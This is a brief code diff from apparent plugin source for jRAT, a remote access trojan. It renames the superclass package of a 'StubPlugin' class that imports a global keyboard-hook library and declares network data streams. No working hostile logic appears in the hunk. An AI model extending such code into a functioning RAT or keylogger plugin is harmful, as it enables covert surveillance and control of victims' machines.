@@ -23,8 +23,7 @@ import jrat.api.stub.utils.OperatingSystem;
 
 import org.jnativehook.GlobalScreen;
 
-
-public class StubPlugin extends pro.jrat.api.stub.StubPlugin {
+public class StubPlugin extends jrat.api.stub.StubPlugin {
 
 	public static DataInputStream dis;
 	public static DataOutputStream dos;
